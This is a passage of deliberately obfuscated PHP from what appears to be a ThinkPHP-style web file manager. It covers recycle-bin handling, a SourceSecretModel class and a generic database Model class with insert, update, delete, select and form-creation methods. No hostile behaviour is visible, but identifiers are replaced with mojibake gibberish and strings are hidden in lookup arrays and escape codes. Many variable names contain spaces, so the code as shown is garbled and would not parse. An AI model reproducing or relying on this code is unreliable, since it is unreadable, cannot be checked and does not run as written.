if ($Ü¦Ã¶ï == $†ëëÍ²¨) { continue; } if (!$¸’¹Àè™->isParentOf($†ëëÍ²¨, $Ü¦Ã¶ï)) { continue; } $©¯Ä—•… = $¸’¹Àè™->sourceInfo($Ü¦Ã¶ï); if ($©¯Ä—•…[$®˜¯í™Ú[468]] == $®˜¯í™Ú[101]) { $€÷ªÉè[] = array($®˜¯í™Ú[635] => array($®˜¯í™Ú[595], $©¯Ä—•…[$®˜¯í™Ú[568]] . $Ü¦Ã¶ï . $®˜¯í™Ú[596])); } else { $€÷ªÉè[$®˜¯í™Ú[194]][1][] = $Ü¦Ã¶ï; } } if (!$€÷ªÉè[$®˜¯í™Ú[194]][1]) { unset($€÷ªÉè[$®˜¯í™Ú[194]]); } if (!$€÷ªÉè) { return; } if (is_array($€÷ªÉè[$®˜¯í™Ú[194]]) && is_array($€÷ªÉè[$®˜¯í™Ú[194]][1])) { $€÷ªÉè[$®˜¯í™Ú[194]][1] = array_unique($€÷ªÉè[$®˜¯í™Ú[194]][1]); } $€÷ªÉè[$®˜¯í™Ú[1053]] = $®˜¯í™Ú[2054]; $¸’¹Àè™->where($€÷ªÉè)->setField($®˜¯í™Ú[488], 1); } private function recycleMove($ê÷Å€Û¸, $€®ıˆãÑ = 1) { $‡ûˆŒ» =& $_SERVER[Ñ¯©ç]; $„¡û¬·Ú = Model($‡ûˆŒ»[1391]); $Ù ª€ã¯ = Model($‡ûˆŒ»[2275]); $¿š¦×¯ = array($‡ûˆŒ»[194] => $ê÷Å€Û¸); if ($€®ıˆãÑ) { $„¡û¬·Ú->where($¿š¦×¯)->setField($‡ûˆŒ»[488], 1); $Ù ª€ã¯->eventRecycle($ê÷Å€Û¸, $‡ûˆŒ»[2276]); } else { $øÜ¢÷º = $„¡û¬·Ú->where($¿š¦×¯)->find(); $ÏêÊÃÆ = $øÜ¢÷º[$‡ûˆŒ»[468]] == $‡ûˆŒ»[101]; $–¯À÷ãø = $„¡û¬·Ú->fileNameAuto($øÜ¢÷º[$‡ûˆŒ»[193]], $øÜ¢÷º[$‡ûˆŒ»[32]], REPEAT_RENAME_FOLDER, $ÏêÊÃÆ); if ($–¯À÷ãø != $øÜ¢÷º[$‡ûˆŒ»[32]]) { $„¡û¬·Ú->rename($ê÷Å€Û¸, $–¯À÷ãø); } $„¡û¬·Ú->where($¿š¦×¯)->setField($‡ûˆŒ»[488], 0); $Ù ª€ã¯->eventRecycle($ê÷Å€Û¸, $‡ûˆŒ»[2277]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\56\163\x6f\x75\x72\143\x65\123\145\143\162\145\164\x4c\151\x73\164"; public $field = array("\163\x6f\x75\162\x63\x65\111\x44", "\164\x79\160\x65\111\x44", "\x63\162\145\x61\x74\x65\125\x73\145\162"); } goto Bã¡ÄÈ¬À; bÉ…ïĞ×Øà: define($_SERVER[Ñ¯©ç][304], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\154\145", "\157\x72\144\145\x72", "\x61\154\x69\141\163", "\x68\141\166\x69\156\x67", "\147\162\157\165\160", "\x6c\157\143\x6b", "\144\x69\x73\x74\x69\156\x63\164", "\x61\165\x74\157", "\146\x69\154\164\x65\x72", "\x76\141\154\151\144\x61\164\x65", "\162\145\163\165\x6c\x74", "\142\151\x6e\144", "\164\x6f\x6b\x65\x6e"); public function __construct($Ğ‰öÒÒ» = '', $×¾Âèò§ = '', $Ì­ ¦· = '') { $±³ßİ =& $_SERVER[Ñ¯©ç]; $this->_initialize(); if (!empty($Ğ‰öÒÒ»)) { if (strpos($Ğ‰öÒÒ», $±³ßİ[10])) { list($this->dbName, $this->name) = explode($±³ßİ[10], $Ğ‰öÒÒ»); } else { $this->name = $Ğ‰öÒÒ»; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($×¾Âèò§)) { $this->tablePrefix = $±³ßİ[12]; } elseif ($±³ßİ[12] != $×¾Âèò§) { $this->tablePrefix = $×¾Âèò§; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($±³ßİ[305]); } $this->db(0, empty($this->connection) ? $Ì­ ¦· : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $÷Âñ œ³ =& $_SERVER[Ñ¯©ç]; if (empty($this->fields)) { if (think_config($÷Âñ œ³[306])) { $ĞÈ›¹Ô£ = $this->dbName ? $this->dbName : think_config($÷Âñ œ³[307]); $ ½üàßŸ = think_var_cache($÷Âñ œ³[308] . strtolower(get_path_this($ĞÈ›¹Ô£) . $÷Âñ œ³[10] . $this->name)); if ($ ½üàßŸ) { $¥Í¦Á‹ = think_config($÷Âñ œ³[309]); if (empty($¥Í¦Á‹) || $ ½üàßŸ[$÷Âñ œ³[310]] == $¥Í¦Á‹) { $this->fields = $ ½üàßŸ; return; } } } $this->flush(); } } public function flush() { $àáÀò‚ =& $_SERVER[Ñ¯©ç]; $this->db->setModel($this->name); $©è¤ŸÀ = $this->db->getFields($this->getTableName()); if (!$©è¤ŸÀ) { return !1; } $this->fields = array_keys($©è¤ŸÀ); $this->fields[$àáÀò‚[311]] = !1; foreach ($©è¤ŸÀ as $êµãÔÁì => $ôÌí«Ä) { $Òİ¶®Ã‘[$êµãÔÁì] = $ôÌí«Ä[$àáÀò‚[33]]; if ($ôÌí«Ä[$àáÀò‚[39]]) { $this->fields[$àáÀò‚[312]] = $êµãÔÁì; if ($ôÌí«Ä[$àáÀò‚[42]]) { $this->fields[$àáÀò‚[311]] = !0; } } } $this->fields[$àáÀò‚[313]] = $Òİ¶®Ã‘; if (think_config($àáÀò‚[309])) { $this->fields[$àáÀò‚[310]] = think_config($àáÀò‚[309]); } if (think_config($àáÀò‚[306])) { $ŸäÜç‹ = $this->dbName ? $this->dbName : think_config($àáÀò‚[307]); think_var_cache($àáÀò‚[308] . strtolower(get_path_this($ŸäÜç‹) . $àáÀò‚[10] . $this->name), $this->fields); } } public function switchModel($ğãôÖ·è, $‹úßèı· = array()) { $ ´Èôäş =& $_SERVER[Ñ¯©ç]; $˜ğÛàµ = ucwords(strtolower($ğãôÖ·è)) . $ ´Èôäş[314]; if (!class_exists($˜ğÛàµ)) { think_exception($˜ğÛàµ . think_lang($ ´Èôäş[315])); } $this->_extModel = new $˜ğÛàµ($this->name); if (!empty($‹úßèı·)) { foreach ($‹úßèı· as $’ëâèì ) { $this->_extModel->setProperty($’ëâèì , $this->{$’ëâèì }); } } return $this->_extModel; } public function __set($ÁÇĞëªÑ, $õšÚ±şİ) { $this->data[$ÁÇĞëªÑ] = $õšÚ±şİ; } public function __get($Úäõµœ) { return isset($this->data[$Úäõµœ]) ? $this->data[$Úäõµœ] : null; } public function __isset($ìØš˜Ûä) { return isset($this->data[$ìØš˜Ûä]); } public function __unset($–çß‰ƒÀ) { unset($this->data[$–çß‰ƒÀ]); } public function __call($¶¡ƒï™, $ª½¨­òî) { $¼Š¾şö =& $_SERVER[Ñ¯©ç]; if (in_array(strtolower($¶¡ƒï™), $this->methods, !0)) { $this->options[strtolower($¶¡ƒï™)] = $ª½¨­òî[0]; return $this; } elseif (in_array(strtolower($¶¡ƒï™), array($¼Š¾şö[316], $¼Š¾şö[317], $¼Š¾şö[318], $¼Š¾şö[319], $¼Š¾şö[320]), !0)) { $È²™èÚÍ = isset($ª½¨­òî[0]) ? $ª½¨­òî[0] : $¼Š¾şö[221]; $È²™èÚÍ = $this->db->parseKey($È²™èÚÍ); return $this->getField(strtoupper($¶¡ƒï™) . $¼Š¾şö[321] . $È²™èÚÍ . $¼Š¾şö[322] . $¶¡ƒï™, $¼Š¾şö[316]); } elseif (strtolower(substr($¶¡ƒï™, 0, 5)) == $¼Š¾şö[323]) { $È²™èÚÍ = think_parse_name(substr($¶¡ƒï™, 5)); $¿’†©ü[$È²™èÚÍ] = $ª½¨­òî[0]; return $this->where($¿’†©ü)->find(); } elseif (strtolower(substr($¶¡ƒï™, 0, 10)) == $¼Š¾şö[324]) { $¹“ÍÕ¡“ = think_parse_name(substr($¶¡ƒï™, 10)); $¿’†©ü[$¹“ÍÕ¡“] = $ª½¨­òî[0]; return $this->where($¿’†©ü)->getField($ª½¨­òî[1]); } elseif (isset($this->_scope[$¶¡ƒï™])) { return $this->scope($¶¡ƒï™, $ª½¨­òî[0]); } elseif (method_exists($this, $¶¡ƒï™)) { array_unshift($ª½¨­òî, $¶¡ƒï™); return call_user_func_array(array($this, $¼Š¾şö[325]), $ª½¨­òî); } else { return call_user_func_array(array(parent, $¶¡ƒï™), $ª½¨­òî); } } protected function call() { $ıüÂ©ôì =& $_SERVER[Ñ¯©ç]; $‚©ø®Ì¼ = func_get_args(); $¡Õïù‚ = array_shift($‚©ø®Ì¼); $ÎÁÈÈ ¬ = $¡Õïù‚; if (is_array($¡Õïù‚)) { $ÎÁÈÈ ¬ = $¡Õïù‚[1]; $¡Õïù‚ = $¡Õïù‚[0]; } $éÓÀÊù» = count($‚©ø®Ì¼) - 1; if (isset($‚©ø®Ì¼[$éÓÀÊù»]) && $‚©ø®Ì¼[$éÓÀÊù»] === $¡Õïù‚) { think_exception(__CLASS__ . $ıüÂ©ôì[4] . $¡Õïù‚ . think_lang($ıüÂ©ôì[326])); return; } $‚©ø®Ì¼[] = $¡Õïù‚; if (method_exists($this, $ıüÂ©ôì[327])) { $ê®Ş ç = call_user_func_array(array($this, $ıüÂ©ôì[328]), array($ÎÁÈÈ ¬, $‚©ø®Ì¼)); if (!is_null($ê®Ş ç) && $ê®Ş ç !== !1) { return $ê®Ş ç; } } $›åÏµÂ† = call_user_func_array(array($this, $¡Õïù‚), $‚©ø®Ì¼); if (method_exists($this, $ıüÂ©ôì[329])) { $ê®Ş ç = call_user_func_array(array($this, $ıüÂ©ôì[330]), array($ÎÁÈÈ ¬, $‚©ø®Ì¼, $›åÏµÂ†)); if ($ê®Ş ç) { return $ê®Ş ç; } } return $›åÏµÂ†; } protected function _initialize() { } protected function _facade($ıÈÇÇùÇ) { $Æ÷–ÀÌã =& $_SERVER[Ñ¯©ç]; if (!empty($this->fields)) { foreach ($ıÈÇÇùÇ as $Œ¿šÆÙá => $»·æµ„¹) { if (is_array($this->fields) && !in_array($Œ¿šÆÙá, $this->fields, !0)) { unset($ıÈÇÇùÇ[$Œ¿šÆÙá]); } elseif (is_scalar($»·æµ„¹)) { $this->_parseType($ıÈÇÇùÇ, $Œ¿šÆÙá); } } } if (!empty($this->options[$Æ÷–ÀÌã[331]])) { $ıÈÇÇùÇ = array_map($this->options[$Æ÷–ÀÌã[331]], $ıÈÇÇùÇ); unset($this->options[$Æ÷–ÀÌã[331]]); } $this->_beforeWrite($ıÈÇÇùÇ); return $ıÈÇÇùÇ; } protected function _beforeWrite(&$ËØŞ¾‚¾) { } public function add($›÷«ÊÔ› = '', $ıä×Â† = array(), $çµ„÷¢¶ = false) { if (empty($›÷«ÊÔ›)) { if (!empty($this->data)) { $›÷«ÊÔ› = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Ñ¯©ç][332]); return !1; } } $ıä×Â† = $this->_parseOptions($ıä×Â†); $›÷«ÊÔ› = $this->_facade($›÷«ÊÔ›); if (!1 === $this->_beforeInsert($›÷«ÊÔ›, $ıä×Â†)) { return !1; } $ú‘¡–ùú = $this->db->insert($›÷«ÊÔ›, $ıä×Â†, $çµ„÷¢¶); if (!1 !== $ú‘¡–ùú) { $•§²ıÎ‰ = $this->getLastInsID(); if ($•§²ıÎ‰) { $›÷«ÊÔ›[$this->getPk()] = $•§²ıÎ‰; $this->_after_insert($›÷«ÊÔ›, $ıä×Â†); return $•§²ıÎ‰; } $this->_after_insert($›÷«ÊÔ›, $ıä×Â†); } return $ú‘¡–ùú; } protected function _beforeInsert(&$åÕğÖ³Ã, $ò±ú€›ß) { } protected function _after_insert($ê»àêª, $¢Ê­ãõš) { } public function addAll($°•±´ë², $³áÒ»Çó = array(), $‹–ÚÓÑÍ = false) { $¶¦ãË§´ =& $_SERVER[Ñ¯©ç]; if (empty($°•±´ë²)) { $this->error = think_lang($¶¦ãË§´[332]); return !1; } $³áÒ»Çó = $this->_parseOptions($³áÒ»Çó); foreach ($°•±´ë² as $˜ÖÈøË => $ış¸ÍÈ) { $°•±´ë²[$˜ÖÈøË] = $this->_facade($ış¸ÍÈ); } if (method_exists($this->db, $¶¦ãË§´[333])) { $çËšÒä™ = $this->db->insertAll($°•±´ë², $³áÒ»Çó, $‹–ÚÓÑÍ); } else { $this->startTrans(); foreach ($°•±´ë² as $˜ÖÈøË => $ış¸ÍÈ) { $çËšÒä™ = $this->db->insert($ış¸ÍÈ, $³áÒ»Çó, $‹–ÚÓÑÍ); } $this->commit(); } if (!1 !== $çËšÒä™) { $²ÚÙ·Şğ = $this->getLastInsID(); if ($²ÚÙ·Şğ) { return $²ÚÙ·Şğ; } } return $çËšÒä™; } public function selectAdd($çá²º×œ = '', $œÖû®É¢ = '', $ÇÄ‡ÕªÃ = array()) { $½Âï¤» =& $_SERVER[Ñ¯©ç]; $ÇÄ‡ÕªÃ = $this->_parseOptions($ÇÄ‡ÕªÃ); if (!1 === ($º¦†¯³¼ = $this->db->selectInsert($çá²º×œ ? $çá²º×œ : $ÇÄ‡ÕªÃ[$½Âï¤»[334]], $œÖû®É¢ ? $œÖû®É¢ : $this->getTableName(), $ÇÄ‡ÕªÃ))) { $this->error = think_lang($½Âï¤»[335]); return !1; } else { return $º¦†¯³¼; } } public function save($Í‘åÇÀ… = '', $“™Ú«ä§ = array()) { $“èÕØ¹× =& $_SERVER[Ñ¯©ç]; if (empty($Í‘åÇÀ…)) { if (!empty($this->data)) { $Í‘åÇÀ… = $this->data; $this->data = array(); } else { $this->error = think_lang($“èÕØ¹×[332]); return !1; } } $Í‘åÇÀ… = $this->_facade($Í‘åÇÀ…); $“™Ú«ä§ = $this->_parseOptions($“™Ú«ä§); $ì·×¯Æ§ = $this->getPk(); if (!isset($“™Ú«ä§[$“èÕØ¹×[336]])) { if (isset($Í‘åÇÀ…[$ì·×¯Æ§])) { $ÌíÛî¬¥[$ì·×¯Æ§] = $Í‘åÇÀ…[$ì·×¯Æ§]; $“™Ú«ä§[$“èÕØ¹×[336]] = $ÌíÛî¬¥; unset($Í‘åÇÀ…[$ì·×¯Æ§]); } else { $this->error = think_lang($“èÕØ¹×[335]); return !1; } } if (is_array($“™Ú«ä§[$“èÕØ¹×[336]]) && isset($“™Ú«ä§[$“èÕØ¹×[336]][$ì·×¯Æ§])) { $Ò½úˆôÕ = $“™Ú«ä§[$“èÕØ¹×[336]][$ì·×¯Æ§]; } if (!1 === $this->_beforeUpdate($Í‘åÇÀ…, $“™Ú«ä§)) { return !1; } $ÔÒÁÙ¦Ö = $this->db->update($Í‘åÇÀ…, $“™Ú«ä§); if (!1 !== $ÔÒÁÙ¦Ö) { if (isset($Ò½úˆôÕ)) { $Í‘åÇÀ…[$ì·×¯Æ§] = $Ò½úˆôÕ; } $this->_afterUpdate($Í‘åÇÀ…, $“™Ú«ä§); } return $ÔÒÁÙ¦Ö; } protected function _beforeUpdate(&$âÍËëšİ, $–äóöî) { } protected function _afterUpdate($ÙÌ”şğ, $¦Ò „ş÷) { } public function delete($Ã¬ëÎä© = array()) { $ ôøÚĞÄ =& $_SERVER[Ñ¯©ç]; if (empty($Ã¬ëÎä©) && empty($this->options[$ ôøÚĞÄ[336]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $èº˜‹¢å = $this->getPk(); if (is_numeric($Ã¬ëÎä©) || is_string($Ã¬ëÎä©)) { if (strpos($Ã¬ëÎä©, $ ôøÚĞÄ[50])) { $¸Ğ©û‹ê[$èº˜‹¢å] = array($ ôøÚĞÄ[337], $Ã¬ëÎä©); } else { $¸Ğ©û‹ê[$èº˜‹¢å] = $Ã¬ëÎä©; } $this->options[$ ôøÚĞÄ[336]] = $¸Ğ©û‹ê; } $Ã¬ëÎä© = $this->_parseOptions(); if (is_array($Ã¬ëÎä©[$ ôøÚĞÄ[336]]) && isset($Ã¬ëÎä©[$ ôøÚĞÄ[336]][$èº˜‹¢å])) { $ìØ¥‰š¿ = $Ã¬ëÎä©[$ ôøÚĞÄ[336]][$èº˜‹¢å]; } $ËòºÇÀ¼ = $this->db->delete($Ã¬ëÎä©); if (!1 !== $ËòºÇÀ¼) { $ ë¦œ¤› = array(); if (isset($ìØ¥‰š¿)) { $ ë¦œ¤›[$èº˜‹¢å] = $ìØ¥‰š¿; } $this->_after_delete($ ë¦œ¤›, $Ã¬ëÎä©); } return $ËòºÇÀ¼; } protected function _after_delete($¨ÅúÄĞ, $§Î§¹Ü¬) { } public function select($Ñ‚äå“â = array()) { $ïãÉ¤Œô =& $_SERVER[Ñ¯©ç]; if (is_string($Ñ‚äå“â) || is_numeric($Ñ‚äå“â)) { $ğÇ‡µÊƒ = $this->getPk(); if (strpos($Ñ‚äå“â, $ïãÉ¤Œô[50])) { $Æà”æï[$ğÇ‡µÊƒ] = array($ïãÉ¤Œô[337], $Ñ‚äå“â); } else { $Æà”æï[$ğÇ‡µÊƒ] = $Ñ‚äå“â; } $this->options[$ïãÉ¤Œô[336]] = $Æà”æï; } elseif (!1 === $Ñ‚äå“â) { $Ñ‚äå“â = $this->_parseOptions(); return $ïãÉ¤Œô[338] . $this->db->buildSelectSql($Ñ‚äå“â) . $ïãÉ¤Œô[339]; } $Ñ‚äå“â = $this->_parseOptions(); $¼ğáùë… = $this->db->select($Ñ‚äå“â); if (!1 === $¼ğáùë…) { return !1; } if (empty($¼ğáùë…)) { return null; } $this->_afterSelect($¼ğáùë…, $Ñ‚äå“â); return $¼ğáùë…; } protected function _afterSelect(&$°ù—¢ãÒ, $›ı‹Å¦Ã) { } public function buildSql($ó½ç¾àÉ = array()) { $†ˆåÚó =& $_SERVER[Ñ¯©ç]; $ó½ç¾àÉ = $this->_parseOptions($ó½ç¾àÉ); return $†ˆåÚó[338] . $this->db->buildSelectSql($ó½ç¾àÉ) . $†ˆåÚó[339]; } public function optionsValue($ÁºÙ‹ç£ = null) { if (is_null($ÁºÙ‹ç£)) { return $this->options; } elseif (is_array($ÁºÙ‹ç£)) { $this->options = array_merge($this->options, $ÁºÙ‹ç£); } } protected function _parseOptions($Ğäèô×¦ = array()) { $ñ¹Æ¯ÎÄ =& $_SERVER[Ñ¯©ç]; if (is_array($Ğäèô×¦)) { $Ğäèô×¦ = array_merge($this->options, $Ğäèô×¦); } $this->options = array(); if (!isset($Ğäèô×¦[$ñ¹Æ¯ÎÄ[340]])) { $Ğäèô×¦[$ñ¹Æ¯ÎÄ[340]] = $this->getTableName(); $¦’½ÂÉÓ = $this->fields; } else { $¦’½ÂÉÓ = $this->getDbFields(); } if (!empty($Ğäèô×¦[$ñ¹Æ¯ÎÄ[341]])) { $Ğäèô×¦[$ñ¹Æ¯ÎÄ[340]] .= $ñ¹Æ¯ÎÄ[53] . $Ğäèô×¦[$ñ¹Æ¯ÎÄ[341]]; } $Ğäèô×¦[$ñ¹Æ¯ÎÄ[342]] = $this->name; if (isset($Ğäèô×¦[$ñ¹Æ¯ÎÄ[336]]) && is_array($Ğäèô×¦[$ñ¹Æ¯ÎÄ[336]]) && !empty($¦’½ÂÉÓ) && !isset($Ğäèô×¦[$ñ¹Æ¯ÎÄ[343]]) && !isset($Ğäèô×¦[$ñ¹Æ¯ÎÄ[340]])) { foreach ($Ğäèô×¦[$ñ¹Æ¯ÎÄ[336]] as $Ê·Û¨¿Ñ => $„áƒÖúˆ) { $Ê·Û¨¿Ñ = trim($Ê·Û¨¿Ñ); if (in_array($Ê·Û¨¿Ñ, $¦’½ÂÉÓ, !0)) { if (is_scalar($„áƒÖúˆ)) { $this->_parseType($Ğäèô×¦[$ñ¹Æ¯ÎÄ[336]], $Ê·Û¨¿Ñ); } } elseif (!is_numeric($Ê·Û¨¿Ñ) && $ñ¹Æ¯ÎÄ[11] != substr($Ê·Û¨¿Ñ, 0, 1) && !1 === strpos($Ê·Û¨¿Ñ, $ñ¹Æ¯ÎÄ[10]) && !1 === strpos($Ê·Û¨¿Ñ, $ñ¹Æ¯ÎÄ[321]) && !1 === strpos($Ê·Û¨¿Ñ, $ñ¹Æ¯ÎÄ[215]) && !1 === strpos($Ê·Û¨¿Ñ, $ñ¹Æ¯ÎÄ[344])) { unset($Ğäèô×¦[$ñ¹Æ¯ÎÄ[336]][$Ê·Û¨¿Ñ]); } } } $this->_options_filter($Ğäèô×¦); return $Ğäèô×¦; } protected function _options_filter(&$’¼ù„÷) { } protected function _parseType(&$©¢­·âï, $“Ôâá¤) { $«ãˆÒãü =& $_SERVER[Ñ¯©ç]; if (empty($this->options[$«ãˆÒãü[345]][$«ãˆÒãü[4] . $“Ôâá¤])) { $×¶›‹ü„ = strtolower($this->fields[$«ãˆÒãü[313]][$“Ôâá¤]); if (!1 !== strpos($×¶›‹ü„, $«ãˆÒãü[346])) { } elseif (!1 === strpos($×¶›‹ü„, $«ãˆÒãü[347]) && !1 !== strpos($×¶›‹ü„, $«ãˆÒãü[348])) { $©¢­·âï[$“Ôâá¤] = intval($©¢­·âï[$“Ôâá¤]); } elseif (!1 !== strpos($×¶›‹ü„, $«ãˆÒãü[349]) || !1 !== strpos($×¶›‹ü„, $«ãˆÒãü[350])) { $©¢­·âï[$“Ôâá¤] = floatval($©¢­·âï[$“Ôâá¤]); } elseif (!1 !== strpos($×¶›‹ü„, $«ãˆÒãü[351])) { $©¢­·âï[$“Ôâá¤] = (bool) $©¢­·âï[$“Ôâá¤]; } } } public function find($ãâ ËÛ„ = array()) { $Øöü°†ô =& $_SERVER[Ñ¯©ç]; if (is_numeric($ãâ ËÛ„) || is_string($ãâ ËÛ„)) { $‹åÍúç¤[$this->getPk()] = intval($ãâ ËÛ„); $this->options[$Øöü°†ô[336]] = $‹åÍúç¤; } $this->options[$Øöü°†ô[352]] = 1; $ãâ ËÛ„ = $this->_parseOptions(); $¶—ıË… = $this->db->select($ãâ ËÛ„); if (!1 === $¶—ıË…) { return !1; } if (empty($¶—ıË…)) { return null; } $this->data = $¶—ıË…[0]; $this->_afterFind($this->data, $ãâ ËÛ„); if (!empty($this->options[$Øöü°†ô[353]])) { return $this->returnResult($this->data, $this->options[$Øöü°†ô[353]]); } return $this->data; } protected function _afterFind(&$ÆÓˆÓ¡’, $½ÏØ—Ü‘) { } protected function returnResult($õş÷³çß, $å…Ü¢ø’ = '') { $¸‹ÍÓù‡ =& $_SERVER[Ñ¯©ç]; if ($å…Ü¢ø’) { if (is_callable($å…Ü¢ø’)) { return call_user_func($å…Ü¢ø’, $õş÷³çß); } switch (strtolower($å…Ü¢ø’)) { case $¸‹ÍÓù‡[354]: return json_encode($õş÷³çß); case $¸‹ÍÓù‡[355]: return xml_encode($õş÷³çß); } } return $õş÷³çß; } public function parseFieldsMap($ƒ…»…¾, $Ğ˜›¡•Ô = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ÖèÏ÷Ú¢ => $©¾Ş·¥§) { if ($Ğ˜›¡•Ô == 1) { if (isset($ƒ…»…¾[$©¾Ş·¥§])) { $ƒ…»…¾[$ÖèÏ÷Ú¢] = $ƒ…»…¾[$©¾Ş·¥§]; unset($ƒ…»…¾[$©¾Ş·¥§]); } } else { if (isset($ƒ…»…¾[$ÖèÏ÷Ú¢])) { $ƒ…»…¾[$©¾Ş·¥§] = $ƒ…»…¾[$ÖèÏ÷Ú¢]; unset($ƒ…»…¾[$ÖèÏ÷Ú¢]); } } } } return $ƒ…»…¾; } public function setField($¶²›Ï ¿, $ùÉ´Šş  = '') { if (is_array($¶²›Ï ¿)) { $û—ÙßÌñ = $¶²›Ï ¿; } else { $û—ÙßÌñ[$¶²›Ï ¿] = $ùÉ´Šş ; } return $this->save($û—ÙßÌñ); } public function setAdd($Õ«¶ï¢‘, $ú¡ñ²óš = 1) { $çÉ×ÇÄ =& $_SERVER[Ñ¯©ç]; $Ôø†Èéº = $Õ«¶ï¢‘ . $çÉ×ÇÄ[356] . $ú¡ñ²óš; if ($ú¡ñ²óš < 0) { $Ôø†Èéº = $Õ«¶ï¢‘ . $ú¡ñ²óš; } return $this->setField($Õ«¶ï¢‘, array($çÉ×ÇÄ[357], $Ôø†Èéº)); } public function getField($ş–Öˆ÷, $ìÊ£Ì·­ = null) { $Éª…ôÅÏ =& $_SERVER[Ñ¯©ç]; $ÜÏ×µîª[$Éª…ôÅÏ[334]] = $ş–Öˆ÷; $ÜÏ×µîª = $this->_parseOptions($ÜÏ×µîª); $ş–Öˆ÷ = trim($ş–Öˆ÷); if (strpos($ş–Öˆ÷, $Éª…ôÅÏ[50])) { if (!isset($ÜÏ×µîª[$Éª…ôÅÏ[352]])) { $ÜÏ×µîª[$Éª…ôÅÏ[352]] = is_numeric($ìÊ£Ì·­) ? $ìÊ£Ì·­ : $Éª…ôÅÏ[12]; } $æª¯ûÙï = $this->db->select($ÜÏ×µîª); if (!empty($æª¯ûÙï)) { $¤½ĞÄÎ  = explode($Éª…ôÅÏ[50], $ş–Öˆ÷); $ş–Öˆ÷ = array_keys($æª¯ûÙï[0]); $Â½‹î”º = array_shift($ş–Öˆ÷); $ª£©¿…Ø = array_shift($ş–Öˆ÷); $óÀİÌ‡è = array(); $ÅÆêÁë“ = count($¤½ĞÄÎ ); foreach ($æª¯ûÙï as $Ò€¢ÊÄ†) { $¬¾óÃş‹ = $Ò€¢ÊÄ†[$Â½‹î”º]; if (2 == $ÅÆêÁë“) { $óÀİÌ‡è[$¬¾óÃş‹] = $Ò€¢ÊÄ†[$ª£©¿…Ø]; } else { $óÀİÌ‡è[$¬¾óÃş‹] = is_string($ìÊ£Ì·­) ? implode($ìÊ£Ì·­, $Ò€¢ÊÄ†) : $Ò€¢ÊÄ†; } } return $óÀİÌ‡è; } } else { if (!0 !== $ìÊ£Ì·­) { $ÜÏ×µîª[$Éª…ôÅÏ[352]] = is_numeric($ìÊ£Ì·­) ? $ìÊ£Ì·­ : 1; } if ($ìÊ£Ì·­ === $Éª…ôÅÏ[316]) { unset($ÜÏ×µîª[$Éª…ôÅÏ[352]]); } $Ò€¢ÊÄ† = $this->db->select($ÜÏ×µîª); if (!empty($Ò€¢ÊÄ†)) { if ($ìÊ£Ì·­ === $Éª…ôÅÏ[316]) { return reset($Ò€¢ÊÄ†[0]); } if (!0 !== $ìÊ£Ì·­ && 1 == $ÜÏ×µîª[$Éª…ôÅÏ[352]]) { return reset($Ò€¢ÊÄ†[0]); } foreach ($Ò€¢ÊÄ† as $ã˜µ—ŠÁ) { $¯Ê¼‘Ü·[] = $ã˜µ—ŠÁ[$ş–Öˆ÷]; } return $¯Ê¼‘Ü·; } } return null; } public function create($Ù÷À¿¼ = '', $»¹ûÎ›¸ = '') { $ØÎ–±äÜ =& $_SERVER[Ñ¯©ç]; if (empty($Ù÷À¿¼)) { $Ù÷À¿¼ = $_POST; } elseif (is_object($Ù÷À¿¼)) { $Ù÷À¿¼ = get_object_vars($Ù÷À¿¼); } if (empty($Ù÷À¿¼) || !is_array($Ù÷À¿¼)) { $this->error = think_lang($ØÎ–±äÜ[332]); return !1; } $Ù÷À¿¼ = $this->parseFieldsMap($Ù÷À¿¼, 0); $»¹ûÎ›¸ = $»¹ûÎ›¸ ? $»¹ûÎ›¸ : (!empty($Ù÷À¿¼[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ØÎ–±äÜ[334]])) { $ƒË¾Ä = $this->options[$ØÎ–±äÜ[334]]; unset($this->options[$ØÎ–±äÜ[334]]); } elseif ($»¹ûÎ›¸ == THINK_MODEL_INSERT && isset($this->insertFields)) { $ƒË¾Ä = $this->insertFields; } elseif ($»¹ûÎ›¸ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ƒË¾Ä = $this->updateFields; } if (isset($ƒË¾Ä)) { if (is_string($ƒË¾Ä)) { $ƒË¾Ä = explode($ØÎ–±äÜ[50], $ƒË¾Ä); } if (think_config($ØÎ–±äÜ[358])) { $ƒË¾Ä[] = think_config($ØÎ–±äÜ[359]); } foreach ($Ù÷À¿¼ as $ëİ‡¥ÑÂ => $¶ú“Èæ) { if (!in_array($ëİ‡¥ÑÂ, $ƒË¾Ä)) { unset($Ù÷À¿¼[$ëİ‡¥ÑÂ]); } } } if (!$this->autoValidation($Ù÷À¿¼, $»¹ûÎ›¸)) { return !1; } if (!$this->autoCheckToken($Ù÷À¿¼)) { $this->error = think_lang($ØÎ–±äÜ[360]); return !1; } if ($this->autoCheckFields) { $ƒË¾Ä = $this->getDbFields(); foreach ($Ù÷À¿¼ as $ëİ‡¥ÑÂ => $¶ú“Èæ) { if (!in_array($ëİ‡¥ÑÂ, $ƒË¾Ä)) { unset($Ù÷À¿¼[$ëİ‡¥ÑÂ]); } elseif (MAGIC_QUOTES_GPC && is_string($¶ú“Èæ)) { $Ù÷À¿¼[$ëİ‡¥ÑÂ] = stripslashes($¶ú“Èæ); } } } $this->autoOperation($Ù÷À¿¼, $»¹ûÎ›¸); $this->data = $Ù÷À¿¼; return $Ù÷À¿¼; } public function autoCheckToken($ÛàáË½°) { $…„şóò¶ =& $_SERVER[Ñ¯©ç]; if (isset($this->options[$…„şóò¶[361]]) && !$this->options[$…„şóò¶[361]]) { return !0; } if (think_config($…„şóò¶[358])) { $ığŠøÜş = 